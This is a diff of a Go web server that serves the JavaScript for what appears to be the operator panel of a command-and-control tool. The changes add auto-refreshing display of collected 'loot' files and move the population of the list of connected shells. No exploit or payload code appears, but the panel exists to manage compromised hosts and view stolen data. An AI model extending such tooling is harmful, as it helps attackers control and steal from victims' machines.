@@ -316,7 +316,7 @@ func User_index()http.HandlerFunc {
 						}(uid)
 					case "getFile": //获取所有用户战利品
 						Get_loots(username,w,r)
-                        case "getAll": //获取用户名下客户端
+                    case "getAll": //获取用户名下客户端
                         shell_list, err := Get_Clients(username)
                         if err != nil {
                             http.Error(w, err.Error(), http.StatusInternalServerError)
@@ -2190,6 +2190,13 @@ func lain() http.HandlerFunc {
             </div>
             <div id="file" class="hidden">
                 <div id="g_file"></div>
+                <script>
+                    const loot = new lain_index();
+                    function Get_loot(){
+                        loot.getloot();
+                    }
+                    Get_loot()
+                </script>
             </div>        
         </div>
     </div>
@@ -2935,6 +2942,7 @@ html := `class index{
                                 return;
                             } else if (Array.isArray(data) && data.length > 0) {
                                 this.User_data = data;
+                                net_init(this.User_data);
                                 this.User_data.forEach(key => {
                                     let userDiv = document.getElementById(key['uid'] + "info");
                                     if (!userDiv) {
@@ -3135,35 +3143,29 @@ html := `class index{
             })
         }
     }
+    async getloot() {
+        const lootFileDiv = document.getElementById('g_file');
+        // 每隔 5 秒自动发送请求
+        setInterval(async () => {
+            try {
+                let response = await fetch(this.server+"/user_index?op=getFile&username=" + this.username);
+                if (!response.ok) {
+                    throw new Error("Failed to fetch loot");
+                }
+                let lootHTML = await response.text();
+                lootFileDiv.innerHTML = lootHTML;  // 更新页面内容
+            } catch (error) {
+                console.error("Error fetching loot:", error);
+            }
+        }, 5000);  // 5000 毫秒 = 5 秒
+    }
+    
 }
 class lain_net{
     constructor(){
         this.server = window.location.protocol + "//" + window.location.host;
         this.username = this.getCookie("cookie");
         this.shell_list=[];
-        this.init()
-    }
-    async init() {
-        try {
-            let url = this.server+"/user_index?op=getAll&username="+this.username;
-            let response = await fetch(url);
-            if (!response.ok) {
-                throw new Error("error: "+response.status);
-            }
-            let shell_json = await response.json();
-            this.shell_list = shell_json;
-            const selectElement = document.getElementById('net_shell');
-            selectElement.innerHTML = '<option value="">Select</option>';
-            // 遍历对象，生成下拉选项
-            Object.entries(this.shell_list).forEach(([key, value]) => {
-                const option = document.createElement('option');
-                option.value = key; // UID
-                option.textContent = value; // Host
-                selectElement.appendChild(option);
-            });
-        } catch (error) {
-            console.error("error:", error);
-        }
     }
     
     getCookie(name) {
@@ -3270,6 +3272,20 @@ class lain_net{
             div.innerHTML = "IP:"+item+"\t";  // 将每个IP显示在新的行中
             have_ip_div.appendChild(div);
         });
+    }
+}
+function net_init(shell_list) {
+    try {
+        const selectElement = document.getElementById('net_shell');
+        selectElement.innerHTML = '<option value="">Select</option>';
+        shell_list.forEach(item => {
+            const option = document.createElement('option');
+            option.value = item.uid; // UID
+            option.textContent = item.host; // Host, 或者你想展示的其它信息
+            selectElement.appendChild(option);
+        });
+    } catch (error) {
+        console.error("error:", error);
     }
 }
 function toggleInfo(uid,op) {
@@ -3401,6 +3417,7 @@ function onMouseUp() {
         });
     });
 });`
+
 			w.Header().Set("Content-Type", "text/javascript")
 			fmt.Fprint(w, html)
 			return
